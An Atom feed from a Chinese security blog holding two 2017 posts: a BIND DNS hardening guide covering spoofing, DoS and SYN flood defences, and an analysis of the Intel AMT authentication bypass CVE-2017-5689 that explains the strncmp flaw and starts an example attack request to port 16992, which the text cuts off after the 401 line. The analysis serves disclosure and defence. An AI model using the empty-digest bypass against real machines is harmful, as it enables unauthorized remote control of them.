<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Netb2c&#39;s Blog</title>
  <subtitle>We&#39;d better struggle for the future rather than regret for the past.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.unixmen.cn/"/>
  <updated>2017-05-09T10:43:57.000Z</updated>
  <id>http://blog.unixmen.cn/</id>
  
  <author>
    <name>Netb2c</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>全面提升BIND DNS服务器安全</title>
    <link href="http://blog.unixmen.cn/2017/05/09/%E5%85%A8%E9%9D%A2%E6%8F%90%E5%8D%87BIND-DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    <id>http://blog.unixmen.cn/2017/05/09/全面提升BIND-DNS服务器安全/</id>
    <published>2017-05-09T10:37:54.000Z</published>
    <updated>2017-05-09T10:43:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文章简介"><a href="#文章简介" class="headerlink" title="文章简介"></a>文章简介</h2><p>本文介绍了当前互联网DNS服务器所存在的隐患（几种典型的DNS攻击方式）及安全加固</p>
<h2 id="DNS服务所面临的安全隐患"><a href="#DNS服务所面临的安全隐患" class="headerlink" title="DNS服务所面临的安全隐患"></a>DNS服务所面临的安全隐患</h2><p>互联网上DNS服务器的事实标准就是ISC的BIND，BillManning对in-addr域的调查发现，有95%的域名服务器(2的2000次方个服务器中)使用的是各种版本的“bind”。这其中包括了所有的DNS根服务器，而这些根服务器对整个服务器的正常运转起着至关重要的作用。<br> DNS服务所面临的安全隐患包括：</p>
<ul>
<li>DNS欺骗（DNSSpoffing）</li>
<li>拒绝服务（Denialofservice，DoS）攻击</li>
<li>分布式拒绝服务攻击（Distributed Denial of Service，DDoS）</li>
<li>缓冲区漏洞溢出攻击（BufferOverflow）</li>
</ul>
<h3 id="1-DNS欺骗"><a href="#1-DNS欺骗" class="headerlink" title="1.DNS欺骗"></a>1.DNS欺骗</h3><p>DNS欺骗即域名信息欺骗是最常见的DNS安全问题。<br>当一个DNS服务器掉入陷阱，使用了来自一个恶意DNS服务器的错误信息，那么该DNS服务器就被欺骗了。DNS欺骗会使那些易受攻击的DNS服务器产生许多安全问题，<br>例如：将用户引导到错误的互联网站点，或者发送一个电子邮件到一个未经授权的邮件服务器。网络攻击者通常通过两种方法进行DNS欺骗。</p>
<ul>
<li><p>（1）缓存感染<br>黑客会熟练的使用DNS请求，将数据放入一个没有设防的DNS服务器的缓存当中。这些缓存信息会在客户进行DNS访问时返回给客户，从而将客户引导到入侵者所设置的运行木马的Web服务器或邮件服务器上，然后黑客从这些服务器上获取用户信息。</p>
</li>
<li><p>（2）DNS信息劫持<br>入侵者通过监听客户端和DNS服务器的对话，通过猜测服务器响应给客户端的DNS查询ID。每个DNS报文包括一个相关联的16位ID号，DNS服务器根据这个ID号获取请求源位置。黑客在DNS服务器之前将虚假的响应交给用户，从而欺骗客户端去访问恶意的网站。</p>
</li>
<li><p>（3）DNS重定向<br>攻击者能够将DNS名称查询重定向到恶意DNS服务器。这样攻击者可以获得DNS服务器的写权限。</p>
</li>
</ul>
<h3 id="2-拒绝服务攻击"><a href="#2-拒绝服务攻击" class="headerlink" title="2.拒绝服务攻击"></a>2.拒绝服务攻击</h3><p>黑客主要利用一些DNS软件的漏洞，如在BIND9版本（版本9.2.0以前的9系列）如果有人向运行BIND的设备发送特定的DNS数据包请求，BIND就会自动关闭。攻击者只能使BIND关闭，而无法在服务器上执行任意命令。如果得不到DNS服务，那么就会产生一场灾难：由于网址不能解析为IP地址，用户将无方访问互联网。这样，DNS产生的问题就好像是互联网本身所产生的问题，这将导致大量的混乱。</p>
<h3 id="3-分布式拒绝服务攻击"><a href="#3-分布式拒绝服务攻击" class="headerlink" title="3.分布式拒绝服务攻击"></a>3.分布式拒绝服务攻击</h3><p>DDOS攻击通过使用攻击者控制的几十台或几百台计算机攻击一台主机，使得服务拒绝攻击更难以防范：使服务拒绝攻击更难以通过阻塞单一攻击源主机的数据流，来防范服务拒绝攻击。SynFlood是针对DNS服务器最常见的分布式拒绝服务攻击。SYNFlood攻击利用的是IPv4中TCP协议的三次握手（Three-WayHandshake）过程进行的攻击。大家知道协议规定，如果一端想向另一端发起TCP连接，它需要首先发送TCPSYN包到对方，对方收到后发送一个TCPSYN+ACK包回来，发起方再发送TCPACK包回去，这样三次握手就结束了。我们把TCP连接的发起方叫作”TCP客户机（TCPClient）”，TCP连接的接收方叫作”TCP服务器（TCPServer）”。</p>
<p>值得注意的是在TCP服务器收到TCPSYNrequest包时，在发送TCPSYN+ACK包回TCP客户机前，TCP服务器要先分配好一个数据区专门服务于这个即将形成的TCP连接。一般把收到SYN包而还未收到ACK包时的连接状态成为半开连接（Half-openConnection）。在最常见的SYNFlood攻击中，攻击者在短时间内发送大量的TCPSYN包给受害者，这时攻击者是TCP客户机，受害者是TCP服务器。根据上面的描述，受害者会为每个TCPSYN包分配一个特定的数据区，只要这些SYN包具有不同的源地址（这一点对于攻击者来说是很容易伪造的）。这将给TCP服务器系统造成很大的系统负担，最终导致系统不能正常工作。</p>
<h3 id="4-缓冲区漏洞溢出攻击"><a href="#4-缓冲区漏洞溢出攻击" class="headerlink" title="4.缓冲区漏洞溢出攻击"></a>4.缓冲区漏洞溢出攻击</h3><p>黑客利用DNS服务器软件存在漏洞，比如对特定的输入没有进行严格检查，那幺有可能被攻击者利用，攻击者构造特殊的畸形数据包来对DNS服务器进行缓冲区溢出攻击。如果这一攻击成功，就会造成DNS服务停止，或者攻击者能够在DNS服务器上执行其设定的任意代码。例如,前一阵子针对Linux平台的BIND的攻击(e.g.Lionworm)程序,就是利用某些版本的BIND漏洞,取得root权限,一旦入侵完成之后,入侵者就可以完全控制整个相关的网络系统,影响非常严重。主要包括：</p>
<ul>
<li><p>（1）更改MX记录，造成邮件被截获、修改或删除。</p>
</li>
<li><p>（2）更改A记录，使您的WWW服务器的域名指向黑客的具有同样WWW内容的主机，诱使访问者登录，获取访问者的密码等相关信息。添加A记录，使黑客的主机拥有被相信的域名，以此来入侵通过启用域名信任机制的系统。</p>
</li>
<li><p>（3）利用这台主机作为攻击其他机器的“跳板”。</p>
</li>
</ul>
<h2 id="应对以上这些安全隐患方法有两个最有效的原则："><a href="#应对以上这些安全隐患方法有两个最有效的原则：" class="headerlink" title="应对以上这些安全隐患方法有两个最有效的原则："></a>应对以上这些安全隐患方法有两个最有效的原则：</h2><h3 id="1-选择安全没有缺陷的DNS版本："><a href="#1-选择安全没有缺陷的DNS版本：" class="headerlink" title="1.选择安全没有缺陷的DNS版本："></a>1.选择安全没有缺陷的DNS版本：</h3><p>BIND主要分为三个版本：</p>
<ul>
<li><p>（1）v4，1998年多数UNIX捆绑的是BIND4，已经被多数厂商抛弃了，除了OpenBSD还在使用。OpenBSD核心人为BIND8过于复杂和不安全，所以继续使用BIND4。这样一来BIND8/9的很多优点都不包括在v4中。</p>
</li>
<li><p>（2）v8，就是如今使用最多最广的版本，其详细内容可以参阅“BIND8+域名服务器安全增强”<a href="http://security.nsfocus.com/showQueryL.asplibID=530" target="_blank" rel="external">http://security.nsfocus.com/showQueryL.asplibID=530</a></p>
</li>
<li><p>（3）v9，最新版本的BIND，全部重新写过，免费（但是由商业公司资助），BIND9在2000年十月份推出，根据调查v9版本的BIND是最安全的，它的最新安全版本在其官方网站：<a href="http://www.isc.org/下载下载源代码安装即可。例如使用Linux系统针对拒绝服务攻击只要将BIND9升级为版本9.2.1即可。" target="_blank" rel="external">http://www.isc.org/下载下载源代码安装即可。例如使用Linux系统针对拒绝服务攻击只要将BIND9升级为版本9.2.1即可。</a></p>
</li>
</ul>
<h3 id="2-保持DNS服务器配置正确、可靠"><a href="#2-保持DNS服务器配置正确、可靠" class="headerlink" title="2.保持DNS服务器配置正确、可靠"></a>2.保持DNS服务器配置正确、可靠</h3><p>这一点相对困难。Linux上的域名服务由named守护进程控制，该进程从主文件：/etc/named.conf中获取信息。它包括一组将主机名称映射为IP地址的各种文件。<br>Linux下主要DNS配置文件见表一、二、三：<br>表－1DNS主要配置文件点击看大图<br>表－2named配置文件族点击看大图named.conf时DNS中的核心它的配置见表三：<br>表－3named.conf文件的配置点击看大图<br>可以看到DNS配置文件是一个复杂的系统。伴随DNS建立出现的许多问题都会引起相同的结果，但起因却不同。但大多数问题是由于配置文件中的语法错误而导致的。DNS是一组文件构成的，所以需要不同工具检查对应文件。一个配置存在缺陷的DNS服务器会存在很大的安全漏洞。这里可以通过一些工具：nslookup、dig、named-checkzone、host、named-checkconf、dlint等对DNS配置文件进行检查。其中安装BIND软件包时自动安装的工具包括：nslookup、dig、named-checkzone、host、named-checkconf。dlint是一个专门检查DNS配置文件开放源代码软件。可以在<br><a href="http://www.domtools.com/dns/dlint.shtml下载。" target="_blank" rel="external">http://www.domtools.com/dns/dlint.shtml下载。</a><br>在维护DNS服务器时，网管员希望知道到底是哪些用户在使用DNS服务器，同时也希望能对DNS状态查询做一个统计。这里我们可以使用dnstop查询DNS服务器状态：<br>软件下载和安装：<br>运行软件：<br>如果想查看通过eth0的DNS网络流量可以使用命令</p>
<p>在运行dnstop的过程中，可以敲入如下命令：s，d，t，1，2，3,ctrl+r，ctrl+x，以交互方式来显示不同的信息。<br>1－（TLD）记录查询的顶级域名，<br>2－（SLD）记录查询的二级域名，<br>3－（SLD）记录查询的三级域名，<br>s－（Source）记录发送dns查询的客户端ip地址表，<br>d－（Destinations）记录dns查询的目的服务器的ip地址表，<br>t－（QueryType）记录查询详细类型。<br>ctrl+r－重新纪录。<br>ctrl+x－退出。更详细信息可以查看mandnstop。</p>
<h2 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a>安全加固</h2><p>下面以使用最为广泛的Unix类DNS软件BIND为例，介绍如何配置一个安全DNS服务器。本文以RHEL4.0为工作平台。</p>
<h3 id="1-隔离DNS服务器"><a href="#1-隔离DNS服务器" class="headerlink" title="1.隔离DNS服务器"></a>1.隔离DNS服务器</h3><p>首先应该隔离BIND服务器，不应该在DNS服务器上跑其他服务，尽量允许普通用户登陆。减少其它的服务可以缩小被攻击的可能性，比如混合攻击。</p>
<h3 id="2-隐藏BIND的版本号"><a href="#2-隐藏BIND的版本号" class="headerlink" title="2.隐藏BIND的版本号"></a>2.隐藏BIND的版本号</h3><p>通常软件的BUG信息是和特定版本相关的，因此版本号是黑客寻求最有价值的信息。黑客使用dig命令可以查询BIND的版本号，然后黑客就知道这个软件有那些漏洞。因此随意公开版本号是不明智的。隐藏BIND版本号比较简单，修改配置文件：/etc/named.conf，在option部分添加version声明将BIND的版本号信息覆盖。例如使用下面的配置声明，当有人请求版本信息时，迫使nmaed显示：“Unsupportedonthisplatform”</p>
<h3 id="3-避免透露服务器信息"><a href="#3-避免透露服务器信息" class="headerlink" title="3.避免透露服务器信息"></a>3.避免透露服务器信息</h3><p>和版本号一样，也不要轻易透露服务器其他信息。为了让潜在的黑客更难得手，建议不要在DNS配置文件中使用这HINFO和TXT两个资源记录。</p>
<h3 id="4-关闭DNS服务器的gluefetching选项"><a href="#4-关闭DNS服务器的gluefetching选项" class="headerlink" title="4.关闭DNS服务器的gluefetching选项"></a>4.关闭DNS服务器的gluefetching选项</h3><p>当DNS服务器返回一个域的域名服务器纪录并且域名服务器纪录中没有A纪录，DNS服务器会尝试获取一个纪录。就称为gluefetching,攻击者可以利用它进行DNS欺骗。关闭gluefetching是一个好方法，修改配置文件：/etc/named.conf.加入一行：</p>
<h3 id="5-使用非root权限运行BIND"><a href="#5-使用非root权限运行BIND" class="headerlink" title="5.使用非root权限运行BIND"></a>5.使用非root权限运行BIND</h3><p>在Linux内核2.3.99以后的版本中，可以以－u选项以非root权限运行BIND。命令如下：</p>
<p>上面的命令表示以nobody用户身份运行BIND。使用nobody身份运行能够降低缓冲区溢出攻击所带来的危险。</p>
<h3 id="6-控制区域-zone-传输"><a href="#6-控制区域-zone-传输" class="headerlink" title="6.控制区域(zone)传输"></a>6.控制区域(zone)传输</h3><p>默认情况下BIND的区域(zone)传输是全部开放的，如果没有限制那么DNS服务器允许对任何人都进行区域传输的话，那么网络架构中的主机名、主机IP列表、路由器名和路由IP列表，甚至包括各主机所在的位置和硬件配置等情况都很容易被入侵者得到。因此，要对区域传输进行必要的限制。可以通过在／etc／named．conf文件当中添加以下语句来限制区域传输：<br>这样只有IP地址为：从192.168.0.52到192.168.0.109的主机能够同DNS服务器进行区域传输。</p>
<h3 id="7-请求限制"><a href="#7-请求限制" class="headerlink" title="7.请求限制"></a>7.请求限制</h3><p>如果任何人都可以对DNS服务器发出请求，那么这是不能接受的。限制DNS服务器的服务范围很重要，可以把许多入侵者据之门外。修改BIND的配置文件：/etc/named.conf加入以下内容：</p>
<p>这样所有的用户都可以访问yourdomain.com的DNS服务器，但是只有168.192.1.0网段的主机用户可以请求DNS服务器的任意服务。<br>另外也不要允许其他网段的主机进行递归询问，在上面文件最后加入一行即可：</p>
<h3 id="8-其他強化措施："><a href="#8-其他強化措施：" class="headerlink" title="8.其他強化措施："></a>8.其他強化措施：</h3><p>（1）使用存取控制清单(AccessControlLists)，主要目的在于产生地址配对清单。<br>语法：acl“name”{address_match_list};<br>　address_match_list：地址匹对清单。<br>例子：acl“mis”{192.168.200.15,192.168.143.192/26};</p>
<p>（2）使用Forwarders代询服务器机制，它将自己无法解析的查询转送到某特定的服务器。<br>语法：forwardersip_address_liest<br>例子：以下是建议的forwarders设定(在/etc/named.conf中)<br>　orwarders{//指定提供查询的上层DNS。<br>　www.twnic.net.tw;//到上层(twnic)的DNS查询。<br>　};<br>需注意的是通常我们指定的是到本身上一层dns，但也可能因dns缓存有误而转送到错误的服务器上。</p>
<p>（3）使用allow-transfer：目的在于只允许授权的网域主机能更新、读取DNS辖区内的记录。<br>语法：allow-transfer{<address_match_list>};<br>例子：address_match_list：允许进行DNS辖区数据传输主机的IP列表。</address_match_list></p>
<p>（4）allow-update：目的在于指定能向本dns服务器提交动态dns更新的主机<br>语法：allow-update{<address_match_list>};<br>例子：address_match_list：允许能向本DNS服务器提交动态DNS更新的主机IP列表</address_match_list></p>
<h3 id="9-使用DNSSEC"><a href="#9-使用DNSSEC" class="headerlink" title="9.使用DNSSEC"></a>9.使用DNSSEC</h3><p>DNS欺骗spoofing对目前网络应用,最大的冲击在于冒名者借着提供假的网域名称与网址的对照信息,可以将不知情用户的网页联机,导引到错误的网站,原本属于用户的电子邮件也可能因而遗失,甚而进一步空开成为阻断服务的攻击。所幸,目前较新的BIND版本,针对这一类问题,已经有加入许多改进的方法,不过真正的解决方案,则有赖封包认证机制的建立与推动。DNSSEC就是试图解决这一类问题的全新机制,BIND9已经完整加以设计并完成。DNSSEC引入两个全新的资源记录类型：KEY和SIG，允许客户端和域名服务器对任何DNS数据的来源进行密码验证。<br>DNSSEC主要依靠公钥技术对于包含在DNS中的信息创建密码签名。密码签名通过计算出一个密码hash数来提供DNS中数据的完整性，并将该hash数封装进行保护。私/公钥对中的私钥用来封装hash数，然后可以用公钥把hash数译出来。如果这个译出的hash值匹配接收者刚刚计算出来的hash树，那么表明数据是完整的。不管译出来的hash数和计算出来的hash数是否匹配，对于密码签名这种认证方式都是绝对正确的，因为公钥仅仅用于解密合法的hash数，所以只有拥有私钥的拥有者可以加密这些信息。</p>
<h3 id="10-为DNS服务器配置DNSFloodDetector"><a href="#10-为DNS服务器配置DNSFloodDetector" class="headerlink" title="10.为DNS服务器配置DNSFloodDetector"></a>10.为DNS服务器配置DNSFloodDetector</h3><p>DNSFloodDetector是针对DNS服务器的SynFlood攻击检测工具，用于侦测恶意的使用DNS查询功能。它利用libpcap的网络数据包捕获函数功能检测网络流量来判断是否受到SynFlood攻击，DNSFloodDetctor运行方式分成：守护进程（daemon）模式和后台（bindsnap）模式。以守护进程模式运行时它会通过syslog发出警示(/var/log/messages)，以后台模式运行时可以得到实时的查询状态。<br>下载安装：</p>
<p>命令格式:<br>dns_flood_detector[选项]<br>主要选项：<br>-iIFNAME监听某一特定接口。<br>-tN当每秒查询数量超过N值时发出警示.<br>-aN经过N秒后重置警示。<br>-wN每隔N秒显示状态。<br>-xN创建N个buckets。<br>-mN每隔N秒显示所有状态。<br>-b以后台模式执行(bindsnap)。<br>-d以守护进程模式执行(daemon)。<br>-v显示较多的输出信息。<br>-h显示使用方式。</p>
<p>应用实例:<br>dns_flood_detector-b-v-v–t3见下图。<br>dns_flood_detector工作界面</p>
<p>messages的纪录：以守护进程模式执行,纪录每秒超过3次查询的纪录,显示最多信息,包含APTRMX纪录等。</p>
<h3 id="11-建立完整的域名服务器"><a href="#11-建立完整的域名服务器" class="headerlink" title="11.建立完整的域名服务器"></a>11.建立完整的域名服务器</h3><p>Linux下的DNS服务器用来存储主机的域名信息。包括三种：<br>（1）惟高速存域名服务器（Cache-onlyserver）<br>惟高速存域名服务器（Cache-onlyserver）不包含域名数据库。它从某个远程服务器取得每次域名服务器查询的回答，一旦取得一个回答，就将它放入高速缓存中。<br>（2）主域名服务器（PrimaryNameserver）<br>主域名服务器是特定域所有信息的权威来源。它从域管理员构造的本地文件中加载域信息，该“区文件”包含着服务器具有管理权的部分域结构的最精确的信息。主域名服务器需要配置包括一组完整的文件：主配置文件（named.conf）、正向域的区文件(named.hosts)、反向域的区文件(named.rev)、高速缓存初始化文件(named.ca)和回送文件(named.local)。<br>（3）辅助域名服务器（SecondNameServer）<br>辅助域名服务器用来从主服务器中转移一整套域信息。辅助域名服务器是可选的配置选项。区文件是从主服务器转移出的，作为磁盘文件保存在辅助域名服务器中。辅助域名服务器不需配置本地区文件。<br>说明：多数域名服务器要根据网络实际情况将以上三种服务器组合，进行合理配置。所有的域名服务器都需要一个设置惟高速缓存服务器提供名字解析。一个域只能建立一个主域名服务器，另外至少要创建一个辅助域名服务器作为主域名服务器的备份。一个域的主服务器可以是其他域的辅助域名服务器。为了提高域名系统的可靠性，应建立辅域名服务器。当主域名服务器不能正常工作的情况下，能够替代主域名服务器对外提供不间断的服务。</p>
<h3 id="12-增强DNS服务器的防范Dos-DDoS功能"><a href="#12-增强DNS服务器的防范Dos-DDoS功能" class="headerlink" title="12.增强DNS服务器的防范Dos/DDoS功能"></a>12.增强DNS服务器的防范Dos/DDoS功能</h3><p>1.使用SYNcookie</p>
<p>SYNCookie是对TCP服务器端的三次握手协议作一些修改，专门用来防范SYNFlood攻击的一种手段。它的原理是，在TCP服务器收到TCPSYN包并返回TCPSYN+ACK包时，不分配一个专门的数据区，而是根据这个SYN包计算出一个cookie值。在收到TCPACK包时，TCP服务器在根据那个cookie值检查这个TCPACK包的合法性。如果合法，再分配专门的数据区进行处理未来的TCP连接。在linux下以root权限执行：</p>
<p>2.增大backlog<br>通过增加backlog的数值，可以一定程度减缓大量SYN请求导致TCP连接阻塞的状况，一般这个数值系统默认是1024，可以增加到1280至2048：</p>
<p>这样在强度不是很高的攻击下，系统响应能力提高了一点。<br>3.缩短retries次数<br>Linux系统默认的tcp_synack_retries是5次，将这个数值减少可以提高系统响应能力，为2次：</p>
<p>修改后，SYN_RECV的数量有了少量减少，系统响应也快了一些。<br>4.限制SYN频率<br>目前比较有效的是对SYN的频率和次数进行限制，这样最大限度的控制了单个IP地址发动攻击的能力。例如将SYN请求的次数限制在30次每分钟，系统默认是5次/秒可以将burst从默认的5个降低到2个。</p>
<p>进行此操作后正常的用户无任何感觉上的差异，而并发的SYN请求量下降了不少，服务响应基本正常了。<br>5.防范SYNAttack攻击<br>SYNAttack”是一种拒绝服务（DoS）的攻击方式，会消耗掉系统中的所有资源，迫使服务器重新启动。使用下面的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#echo1&gt;/proc/sys/net/ipv4/tcp_syncookies</div></pre></td></tr></table></figure></p>
<p>把这个命令加入”/etc/rc.d/rc.local”文件中，等下次系统重新启动的时候就可以自动生效。</p>
<h3 id="13-使用分布式DNS负载均衡"><a href="#13-使用分布式DNS负载均衡" class="headerlink" title="13.使用分布式DNS负载均衡"></a>13.使用分布式DNS负载均衡</h3><p>在众多的负载均衡架构中，基于DNS解析的负载均衡本身就拥有对DDOS（SYNFlood）的免疫力，基于DNS解析的负载均衡能将用户的请求分配到不同IP的服务器主机上，攻击者攻击的永远只是其中一台服务器，一来这样增加了攻击者的成本，二来过多的DNS请求可以帮助我们追查攻击者的真正踪迹（DNS请求不同于SYN攻击，是需要返回数据的，所以很难进行IP伪装）。但是基于DNS解析的负载均衡成本很高。很多中小公司没有部署这个技术。</p>
<h3 id="14-防范对于DNS服务器网络"><a href="#14-防范对于DNS服务器网络" class="headerlink" title="14.防范对于DNS服务器网络"></a>14.防范对于DNS服务器网络</h3><p>嗅探器技术被广泛应用于网络维护和管理方面，它工作的时候就像一部被动声纳，默默的接收看来自网络的各种信息，通过对这些数据的分析，网络管理员可以深入了解网络当前的运行状况，以便找出网络中的漏洞。在网络安全日益被注意的今天.我们不但要正确使用嗅探器。还要合理防范嗅探器的危害.嗅探器能够造成很大的安全危害，主要是因为它们不容易被发现。对于一个安全性能要求很严格的企业，同时使用安全的拓扑结构、会话加密、使用静态的ARP地址是有必要的。</p>
<h3 id="15-及时更新系统补丁"><a href="#15-及时更新系统补丁" class="headerlink" title="15.及时更新系统补丁"></a>15.及时更新系统补丁</h3><p>你应该经常到你所安装的系统发行商的主页上去找最新的补丁。目前操作系统维护主要分两种模式：对于私有操作系统（Windows/Solaris等）由于个人用户不能直接接触其源代码，其代码由公司内部开发人员维护，其安全性由同样的团队保证，内核的修正与其他应用程序一样，以patch/SP包的方式发布。对于Linux这样的开放式系统，是一种开放的结构。应该说，开放的模式是双刃剑。从机制上讲，全世界的开发人员都能获得源代码，从而找出其中的纰漏，似乎安全性应该更好;但是同时，如果网络管理人员不能及时更新内核，也会留下安全隐患。如果你是一个Linux网管员，你经常需要上相应的网站看，是否有补丁，是否有了bugfix，是否需要升级。Linux服务器运行的软件主要包括：Bind，Apache等软件大都是开源软件，而且都在不停升级，稳定版和测试版交替出现。在www.apache.org上，最新的changeLog中都写着：bugfix,securitybugfix的字样。所以Linux网管员要经常的关注相关网站及时升级或添加补丁。</p>
<p>##总结：<br>DNS是网络服务的基础建设，要长期不断地保持其正常运作，每一个DNS服务器都应该定期检测。域名系统的配置和管理是一项比较复杂和繁琐的系统管理任务，它对整个网络的运行影响极大。为了保证DNS服务器的安全运行，不仅要使用可靠的服务器软件版本，而且要对DNS服务器进行安全配置，同时还要跟踪服务器软件和操作系统的各种漏洞。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;文章简介&quot;&gt;&lt;a href=&quot;#文章简介&quot; class=&quot;headerlink&quot; title=&quot;文章简介&quot;&gt;&lt;/a&gt;文章简介&lt;/h2&gt;&lt;p&gt;本文介绍了当前互联网DNS服务器所存在的隐患（几种典型的DNS攻击方式）及安全加固&lt;/p&gt;
&lt;h2 id=&quot;DNS服务所面临
    
    </summary>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E5%AE%89%E5%85%A8/"/>
    
      <category term="bind" scheme="http://blog.unixmen.cn/categories/%E5%AE%89%E5%85%A8/bind/"/>
    
      <category term="DNS" scheme="http://blog.unixmen.cn/categories/%E5%AE%89%E5%85%A8/bind/DNS/"/>
    
    
      <category term="安全" scheme="http://blog.unixmen.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="bind" scheme="http://blog.unixmen.cn/tags/bind/"/>
    
      <category term="DNS攻击" scheme="http://blog.unixmen.cn/tags/DNS%E6%94%BB%E5%87%BB/"/>
    
      <category term="DNS安全加固" scheme="http://blog.unixmen.cn/tags/DNS%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>英特尔AMT功能远程提权高危漏洞（CVE-2017-5689）分析</title>
    <link href="http://blog.unixmen.cn/2017/05/09/%E8%8B%B1%E7%89%B9%E5%B0%94AMT%E5%8A%9F%E8%83%BD%E8%BF%9C%E7%A8%8B%E6%8F%90%E6%9D%83%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-5689%EF%BC%89%E5%88%86%E6%9E%90/"/>
    <id>http://blog.unixmen.cn/2017/05/09/英特尔AMT功能远程提权高危漏洞（CVE-2017-5689）分析/</id>
    <published>2017-05-09T09:20:23.000Z</published>
    <updated>2017-05-09T09:21:25.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文章简述"><a href="#文章简述" class="headerlink" title="文章简述"></a>文章简述</h2><p>本文讲述英特尔AMT功能远程提权高危漏洞介绍，说明及漏洞验证及修复方法。</p>
<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>这款漏洞编号为CVE-2017-5689，能够影响到英特尔远程管理技术，包括Active Management Technology (AMT), Intel Standard Manageability(ISM)和Intel Small Business Technology (SBT)软件，版本号由6开始到11.6。如果你在电脑上看到过这些标志，那么你很有可能中招了。</p>
<p>漏洞最先由Embedi 研究团队的MaksimMalyutin在二月中旬发现，发现后他立即提交给了英特尔安全团队。</p>
<p>现在大部分系统管理员已经通过补丁更新了系统，Embedi决定披露<a href="https://embedi.com/news/what-you-need-know-about-intel-amt-vulnerability" target="_blank" rel="external">更多细节</a>。</p>
<p>黑客能够通过发送空的验证字符串来劫持使用英特尔芯片的电脑，在了解其中的原理之前我们得先回答下面几个问题：</p>
<blockquote>
<p>什么是Intel AMT？<br>Intel AMT漏洞出现在哪里？<br>黑客怎样利用这个漏洞？</p>
</blockquote>
<h2 id="什么是Intel-AMT？"><a href="#什么是Intel-AMT？" class="headerlink" title="什么是Intel AMT？"></a>什么是Intel AMT？</h2><p>英特尔通过其 vPro 商务处理器平台提供了 Intel Active Management Technology(AMT)技术，这项技术能让IT管理人员远程管理和修复PC、工作站和服务器。</p>
<p>这项预设的功能使用基于Web的控制页面，通过远程端口16992和16993让管理员远程管理系统。</p>
<p>Intel AMT Web界面甚至可以在系统关机时运作，因为它集成在芯片中，所以可以独立于操作系统运作，只要机器连接了电源和网线。</p>
<h2 id="Intel-AMT漏洞出现在哪里？"><a href="#Intel-AMT漏洞出现在哪里？" class="headerlink" title="Intel AMT漏洞出现在哪里？"></a>Intel AMT漏洞出现在哪里？</h2><p>为了防止功能被未授权的用户滥用，AMT服务会使用HTTP摘要认证和Kerberos验证机制。</p>
<p>权限提升漏洞就出现在Intel AMT Web界面通过HTTP摘要认证协议认证用户的环节，这是个基于挑战/应答(Challenge/Response)方式的身份认证系统。</p>
<p>在解释漏洞之前我们先了解一下摘要认证的原理，摘要认证包含以下这些步骤：</p>
<blockquote>
<p>用户先发起一个没有认证证书的登陆请求，作为响应，服务器回复一个随机数（称作”nonce“）、HTTP方法以及请求的URI。<br>接下来用户就会被提示输入用户名和密码。<br>输入后，客户端就会发送一个加密的字符串(user_response)，字符串是使用一个单向的加密函数生成的一个消息摘要（message digest），该摘要由用户名、密码、给定的nonce值、HTTP方法，以及所请求的URI生成。<br>而服务器端也会通过数据库中的用户名密码计算一个类似的加密字符串(computed_response)。<br>服务器使用strncmp()函数对两个字符串进行比较，如果二者相符就会让用户登陆Intel AMT Web界面。</p>
</blockquote>
<p>而Intel AMT漏洞正是出现在strncmp()函数中。</p>
<p>语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strncmp (string_1, string_2 , length)</div></pre></td></tr></table></figure></p>
<p>其中length参数定义了多少个字符会被比较</p>
<p>Strncmp()是一个二进制安全字符串比较函数，所谓二进制安全就是指在一个二进制文件上所执行的不更改文件内容的功能或者操作，其本质上将操作输入作为原始的、无任何特殊格式意义的数据流。函数的返回值包括负整数，0和正整数，取决于string_1是否比string_2大，如果二者相等，则返回0。</p>
<p>存在问题的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if(strncmp(computed_response, user_response, response_length))</div><div class="line">exit(0x99);</div></pre></td></tr></table></figure></p>
<p>很明显，要认证成功，变量user_response的值必须等于computed_response，因此无论长度如何，strncmp()函数的返回值必须为0。</p>
<p>但是写这段代码的程序员错误地吧user_response的长度放到了strncmp()函数中，而非computed_response。</p>
<h2 id="黑客如何利用？"><a href="#黑客如何利用？" class="headerlink" title="黑客如何利用？"></a>黑客如何利用？</h2><p>要想利用漏洞，未经授权的用户只需要发送空的user_response值。</p>
<p>由于strncmp()错误地用user_response变量来认证用户，因此，发送null值就会让比较很熟认为user_response与computed_response相等，从而通过验证。</p>
<p>攻击示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">GET /index.htm HTTP/1.1</div><div class="line">Host: 127.0.0.1:16992</div><div class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101</div><div class="line">Firefox/45.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: en-US,en;q=0.5</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: keep-alive</div><div class="line">HTTP/1.1 401 